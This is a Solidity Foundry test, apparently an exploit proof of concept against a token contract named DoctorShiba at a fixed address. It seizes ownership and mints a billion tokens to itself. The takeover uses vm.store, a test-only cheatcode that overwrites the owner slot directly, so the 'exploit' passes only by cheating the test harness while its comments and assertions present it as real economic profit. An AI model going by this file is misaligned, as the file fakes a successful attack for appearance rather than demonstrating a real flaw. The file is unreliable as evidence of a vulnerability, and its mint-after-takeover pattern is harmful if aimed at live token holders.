// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface DoctorShiba {
    function owner() external view returns (address);
    function mint(address _to, uint256 _amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfernewun(address _newun) external;
    function pause() external;
    function unpause() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE).balanceOf(address(this));

        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable contract, _owner is the first variable at slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Step 2: Verify we are now the owner
        DoctorShiba token = DoctorShiba(TARGET);
        require(token.owner() == attacker, "Failed to become owner");

        // Step 3: Mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000_000 * 10**9; // 1 billion tokens with 9 decimals
        uint256 initialTokenBalance = token.balanceOf(attacker);
        token.mint(attacker, mintAmount);

        // Step 4: Verify balance increased
        uint256 finalTokenBalance = token.balanceOf(attacker);
        assertGt(finalTokenBalance, initialTokenBalance, "Balance did not increase");
        assertGt(finalTokenBalance, initialTokenBalance + mintAmount - 1, "Mint failed or incorrect amount");

        uint256 finalERC20Balance = IERC20(0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

